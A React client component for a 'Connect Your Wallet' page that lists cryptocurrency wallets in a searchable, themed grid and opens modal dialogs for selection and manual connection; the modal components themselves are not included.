'use client';
import React, { useState } from 'react';
import Header from '../components/Header';
import { useTheme } from '../contexts/ThemeContext';
import { wallets } from '../data/wallets';
import WalletModal from '../components/WalletModal';
import WalletConnectModal from '../components/WalletConnectModal';

const WalletList = () => {
  const [searchTerm, setSearchTerm] = useState("");
  const { theme } = useTheme();
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isConnectModalOpen, setIsConnectModalOpen] = useState(false);

  const filteredWallets = wallets.filter((wallet) => 
    wallet.name.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
    setIsModalOpen(true);
  };

  const closeModal = () => {
    setIsModalOpen(false);
  };

  const handleManualConnect = (wallet) => {
    console.log('Manual connect triggered for wallet:', wallet);
    setIsModalOpen(false);
    setIsConnectModalOpen(true);
  };

  const closeConnectModal = () => {
    setIsConnectModalOpen(false);
  };

  return (
    <div className={`min-h-screen w-full ${theme === 'dark' ? 'bg-black text-white' : 'bg-gray-50 text-gray-900'}`}>
      <Header />
      
      <main className="pt-34 px-2 sm:px-4 lg:px-6 max-w-6xl mx-auto">
        {/* Header Section */}
        <div className="text-center mb-4">
          <h1 className={`text-3xl font-bold mb-4 ${theme === 'dark' ? 'text-white' : 'text-gray-900'}`}>
            Connect Your Wallet
          </h1>
          <p className={`mb-3 ${theme === 'dark' ? 'text-gray-300' : 'text-gray-600'}`}>
            Choose your preferred wallet to connect
          </p>

          {/* Search Input */}
          <div className="relative w-5/5 mx-auto">
            <input
              type="text"
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className={`w-full px-4 py-2 rounded-lg border ${
                theme === 'dark' 
                  ? 'bg-white border-gray-600 text-white placeholder-gray-400' 
                  : 'bg-white border-gray-300 text-gray-900 placeholder-gray-500'
              } focus:outline-none focus:ring-2 focus:ring-blue-500 justify-center text-center`}
              placeholder="Search wallet names..."
            />
          </div>
        </div>

        {/* Wallet Grid */}
        <div className="grid grid-cols-3 sm:grid-cols-6 gap-4 mb-4">
          {filteredWallets.length > 0 ? (
            filteredWallets.map((wallet) => (
              <button
                key={wallet.id}
                onClick={() => handleWalletSelect(wallet)}
                className={`flex flex-col items-center p-4 rounded-lg transition-colors ${
                  theme === 'dark' 
                    ? 'hover:bg-gray-700' 
                    : 'hover:bg-gray-100'
                }`}
              >
                <div className="w-10 h-10 sm:w-20 sm:h-20 border-4 border-white rounded-full flex items-center justify-center mb-1">
                  <img 
                    src={wallet.icon} 
                    alt={wallet.name} 
                    className="w-full h-full object-contain rounded-full" 
                    onError={(e) => { e.target.onerror = null; e.target.src = 'https://via.placeholder.com/150'; }} 
                  />
                </div>
                <span className={`text-sm font-medium ${theme === 'dark' ? 'text-gray-200' : 'text-gray-700'}`}>
                  {wallet.name}
                </span>
              </button>
            ))
          ) : (
            <div className="col-span-full text-center py-12">
              <p className={theme === 'dark' ? 'text-gray-400' : 'text-gray-500'}>
                No wallets found matching "{searchTerm}"
              </p>
            </div>
          )}
        </div>

        {/* Modal */}
        {isModalOpen && (
          <WalletModal 
            wallet={selectedWallet} 
            onClose={closeModal} 
            onManualConnect={handleManualConnect}
          />
        )}
        
        {/* Connect Modal */}
        {isConnectModalOpen && (
          <WalletConnectModal 
            wallet={selectedWallet}
            onClose={closeConnectModal} 
          />
        )}
      </main>
    </div>
  );
};

export default WalletList;
